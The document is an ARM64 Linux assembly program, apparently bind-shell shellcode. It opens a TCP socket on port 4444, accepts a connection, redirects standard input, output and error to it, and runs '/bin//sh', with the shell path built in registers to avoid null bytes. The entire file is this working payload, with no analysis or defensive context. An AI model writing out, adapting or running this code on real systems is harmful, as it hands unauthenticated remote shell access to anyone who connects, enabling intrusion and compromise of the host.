.global _start
.text

_start:
	// socket 
	mov x0, xzr
	add x0, x0, #2		// AF_INET
	sub x1, x0, #1		// SOCK_STREAM
	eor x2, x2, x2		// protocol
	mov x8,	#198		// socket (/usr/include/asm-generic/unistd.h) 
	svc #0			// invoke socket syscall
	mov x9, x0		// save socket file descriptor

	// bind
	sub sp, sp, #16		// stack space
	mov w3, #0x5c110000	// htons(4444) (sockaddr_in)
	add w3, w3, #2		// AF_INET (sockaddr_in)
	str x3, [sp]		// family + port + address (INADDR_ANY)
	mov x1, sp 		// struct address
	mov x2, #16		// struct size
	mov x0, x9		// sockfd
	add x8, x8, #2		// bind (/usr/include/asm-generic/unistd.h) 
	svc #0			// invoke bind syscall

	// listen
	mov x0, x9		// sockfd
	eor x1, x1, x1		// backlog
	add x8, x8, #1		// listen (/usr/include/asm-generic/unistd.h)
	svc #0			// invoke listen syscall
		
	// accept
	mov x0, x9 		// sockfd
	eor x1, x1, x1		// client address
	eor x2, x2, x2		// address length
	add x8, x8, #1		// accept (/usr/include/asm-generic/unistd.h)
	svc #0			// invoke accept syscall
	mov x9, x0		// save accept file descriptor

	// dup3 loop
	eor x10, x10, x10	// loop counter = 0

dup3loop:
	mov x0, x9		// acceptfd
	mov x1, x10		// newfd
	eor x2, x2, x2		// flags = 0		
	mov x8, #24		// dup3 (/usr/include/asm-generic/unistd.h)
	svc #0			// invoke dup3 syscall
	add x10, x10, #1	// inc counter
	cmp x10, #3		// compare counter with 3
	blt dup3loop		// loop while newfd < 3

	// execve
	// "/bin//sh"
	movz x0, #0x622f
	movk x0, #0x6e69, lsl #16
	movk x0, #0x2f2f, lsl #32
	movk x0, #0x6873, lsl #48
	
	stp x0, xzr, [sp, #-16]!

	mov x0, sp
	eor x1, x1, x1		// argv
	eor x2, x2, x2		// envp
	mov x8, #221		// execve (/usr/include/asm-generic/unistd.h)
	svc #0			// invoke execve syscall
